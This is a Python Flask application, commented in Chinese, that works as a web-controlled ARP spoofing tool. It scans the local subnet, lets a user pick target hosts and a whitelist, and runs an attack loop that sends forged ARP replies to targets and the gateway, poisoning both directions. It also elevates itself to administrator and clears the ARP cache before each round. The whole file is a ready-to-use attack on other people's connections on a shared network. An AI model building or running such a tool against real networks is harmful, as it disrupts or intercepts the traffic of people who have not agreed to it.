import os
import subprocess
import threading
import time
import ctypes
import sys
import webbrowser
import socket

from flask import Flask, render_template, request, jsonify
from scapy.all import ARP, Ether, srp, sendp, conf, get_if_addr, get_if_list, get_if_hwaddr

try:
    from ArpIP import openlock
except ImportError:
    def openlock():
        print("ArpIP 模块缺失")

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_dir, relative_path)

app = Flask(__name__,
            template_folder=resource_path("templates"),
            static_folder=resource_path("static"))

state = {
        "is_running": False,
        "targets": [],
        "gateway_ip": "",
        "gateway_mac": None,
        "local_ip": "127.0.0.1",
        "whitelist": [],
        "bidirectional": True,
        "packet_count": 0,
        "iface_name": "",
        "iface": None,             # 当前使用的网卡名称
        "interval": 2.0,
        "last_scan_clients": [],   # 保存最后一次扫描的玩家列表，供前端同步
        "available_ifaces": []     # 可用网卡列表
}

def run_as_admin():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            script = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
            sys.exit(0)
    except:
        pass

def clear_arp_cache():
    """每次发包前清空本机 ARP 缓存，防止缓存干扰伪造的 ARP 条目"""
    try:
        subprocess.run(["arp", "-d", "*"], capture_output=True, shell=True)
    except:
        pass

def get_available_ifaces():
    """获取系统中所有可用网卡列表"""
    ifaces = []
    try:
        raw_list = get_if_list()
        for name in raw_list:
            try:
                ip = get_if_addr(name)
                mac = get_if_hwaddr(name)
                if ip and ip != "0.0.0.0" and mac:
                    is_loopback = ip.startswith("127.")
                    ifaces.append({"name": name, "ip": ip, "mac": mac, "is_loopback": is_loopback})
            except:
                pass
    except:
        pass
    if not ifaces:
        try:
            name = str(conf.iface)
            ip = get_if_addr(conf.iface)
            mac = get_if_hwaddr(conf.iface)
            ifaces.append({"name": name, "ip": ip, "mac": mac, "is_loopback": ip.startswith("127.")})
        except:
            ifaces.append({"name": str(conf.iface), "ip": "0.0.0.0", "mac": "00:00:00:00:00:00", "is_loopback": False})
    return ifaces

def auto_select_best_iface(ifaces):
    """自动选择最佳网卡（优先选有默认路由的、非回环的）"""
    best = None
    best_score = -1
    for iface in ifaces:
        score = 0
        if not iface["is_loopback"]:
            score += 10
        ip = iface["ip"]
        if ip and ip != "0.0.0.0" and not ip.startswith("169.254"):
            score += 5
        try:
            route = conf.route.route("0.0.0.0")
            if route and len(route) > 2:
                if str(route[0]) == iface["name"]:
                    score += 20
        except:
            pass
        if score > best_score:
            best_score = score
            best = iface
    if best:
        return best
    for iface in ifaces:
        if not iface["is_loopback"]:
            return iface
    return ifaces[0] if ifaces else {"name": str(conf.iface), "ip": "0.0.0.0", "mac": "00:00:00:00:00:00"}

def get_local_ip_fallback():
    """获取本机 IP，多种方法兜底"""
    try:
        ip = get_if_addr(conf.iface)
        if ip and ip != "0.0.0.0":
            return ip
    except:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and ip != "0.0.0.0":
            return ip
    except:
        pass
    try:
        gw = conf.route.route("0.0.0.0")
        if gw and len(gw) > 1:
            ip = gw[1]
            if ip and ip != "0.0.0.0":
                return ip
    except:
        pass
    return "127.0.0.1"

def init_network():
    try:
        # 获取所有可用网卡
        ifaces = get_available_ifaces()
        state["available_ifaces"] = ifaces
        # 自动选择最佳网卡
        best = auto_select_best_iface(ifaces)
        state["local_ip"] = best["ip"]
        state["iface_name"] = best["name"]
        state["iface"] = best["name"]  # 保存网卡名称供后续 srp/sendp 使用
        # 检测网关
        gw = conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            state["gateway_ip"] = gw
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw), timeout=3, verbose=False, retry=2)
            if ans: state["gateway_mac"] = ans[0][1].hwsrc
    except:
        pass

def attack_loop():
    iface = state.get("iface")
    while state["is_running"]:
        try:
            # 每次发包前清空本机 ARP 缓存，确保伪造的 ARP 条目不被系统缓存覆盖
            clear_arp_cache()

            current_wl = state["whitelist"] + [state["gateway_ip"], state["local_ip"]]
            for target in state["targets"]:
                if target['ip'] in current_wl:
                    continue
                p1 = Ether(dst=target['mac']) / ARP(op=2, pdst=target['ip'], hwdst=target['mac'],
                                                    psrc=state["gateway_ip"])
                sendp(p1, iface=iface, verbose=False)
                if state["bidirectional"] and state["gateway_mac"]:
                    p2 = Ether(dst=state["gateway_mac"]) / ARP(op=2, pdst=state["gateway_ip"],
                                                               hwdst=state["gateway_mac"], psrc=target['ip'])
                    sendp(p2, iface=iface, verbose=False)
                state["packet_count"] += (2 if state["bidirectional"] else 1)
            time.sleep(state["interval"])
        except Exception:
            break
    # 循环退出时确保状态同步
    state["is_running"] = False

@app.route('/api/quit', methods=['POST'])
def quit_server():
    threading.Timer(0.5, lambda: os._exit(0)).start()
    return {"status": "正在强制退出..."}

@app.route('/')
def index():
    whitelist_str = ', '.join(state["whitelist"])
    return render_template('index.html', info=state, whitelist_str=whitelist_str)

@app.route('/api/scan', methods=['POST'])
def scan():
    state["gateway_ip"] = request.json.get('gateway_ip')
    state["whitelist"] = request.json.get('whitelist', [])
    wl_ips = state["whitelist"] + [state["gateway_ip"], state["local_ip"]]

    # 如果网关为空，用本机 IP 推断
    gw_ip = state["gateway_ip"]
    if not gw_ip or gw_ip == "0.0.0.0":
        if state["local_ip"] and state["local_ip"] != "127.0.0.1":
            gw_ip = ".".join(state["local_ip"].split('.')[:-1]) + ".1"
            state["gateway_ip"] = gw_ip
        else:
            return jsonify([])

    network = ".".join(gw_ip.split('.')[:-1]) + ".0/24"

    # 获取当前使用的网卡
    iface = state.get("iface")

    # 先扫描网关
    ans_gw, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
                    timeout=3, verbose=False, retry=2, iface=iface)
    if ans_gw:
        state["gateway_mac"] = ans_gw[0][1].hwsrc

    # 扫描整个网段 - 增加超时和重试
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                 timeout=5, verbose=False, retry=3, iface=iface)

    # 如果没扫到任何设备，尝试用本机 IP 所在网段再扫一次（手机热点场景）
    if len(ans) == 0 and state["local_ip"] != "127.0.0.1":
        alt_network = ".".join(state["local_ip"].split('.')[:-1]) + ".0/24"
        if alt_network != network:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=alt_network),
                         timeout=5, verbose=False, retry=3, iface=iface)

    clients = []
    found_ips = set()
    for _, rcv in ans:
        ip, mac = rcv.psrc, rcv.hwsrc
        if ip in found_ips:
            continue
        found_ips.add(ip)
        is_safe = ip in wl_ips or (state["gateway_mac"] and mac == state["gateway_mac"]) or ip == state["local_ip"]
        role = ""
        if ip == state["local_ip"]:
            role = "管理"
        elif ip == state["gateway_ip"]:
            role = "房主"
        clients.append({
            "ip": ip,
            "mac": mac.upper(),
            "role": role,
            "is_safe": is_safe
        })
    # 保存扫描结果，供前端实时同步
    state["last_scan_clients"] = clients
    return jsonify(clients)

@app.route('/api/update_whitelist', methods=['POST'])
def update_whitelist():
    state["whitelist"] = request.json.get('whitelist', [])
    return jsonify({"status": "updated"})

@app.route('/api/update_targets', methods=['POST'])
def update_targets():
    state["targets"] = request.json.get('targets', [])
    return jsonify({"status": "targets updated"})

@app.route('/api/update_config', methods=['POST'])
def update_config():
    data = request.json
    if 'bidirectional' in data:
        state["bidirectional"] = data['bidirectional']
    if 'interval' in data:
        new_interval = float(data['interval'])
        if 0.1 <= new_interval <= 999.0:
            state["interval"] = new_interval
    return jsonify({"status": "config updated"})

@app.route('/api/control', methods=['POST'])
def control():
    data = request.json
    if data['action'] == "start":
        state["targets"] = data['targets']
        state["bidirectional"] = data['bidirectional']
        state["whitelist"] = data['whitelist']
        if 'interval' in data:
            state["interval"] = float(data['interval'])
        if not state["is_running"]:
            state["is_running"] = True
            state["packet_count"] = 0
            threading.Thread(target=attack_loop, daemon=True).start()
    else:
        state["is_running"] = False
    return jsonify({"status": "success", "running": state["is_running"]})

@app.route('/api/openlock', methods=['POST'])
def handle_openlock():
    threading.Thread(target=openlock, daemon=True).start()
    return jsonify({"status": "launched"})

@app.route('/api/status')
def get_status():
    """返回运行时状态（包计数、运行标志）"""
    return jsonify({"count": state["packet_count"], "running": state["is_running"]})

@app.route('/api/state')
def get_full_state():
    """返回全量状态，供前端页面刷新后恢复勾选、列表、配置等"""
    # 将 targets IP 转为 set 方便前端判断哪些 IP 被选中
    target_ips = [t["ip"] for t in state["targets"]]
    return jsonify({
        "running": state["is_running"],
        "targets": target_ips,
        "whitelist": state["whitelist"],
        "bidirectional": state["bidirectional"],
        "interval": state["interval"],
        "packet_count": state["packet_count"],
        "gateway_ip": state["gateway_ip"],
        "local_ip": state["local_ip"],
        "iface_name": state["iface_name"],
        "clients": state["last_scan_clients"]
    })

if __name__ == "__main__":
    run_as_admin()
    init_network()
    webbrowser.open("http://127.0.0.1:9178")
    app.run(host='0.0.0.0', port=9178)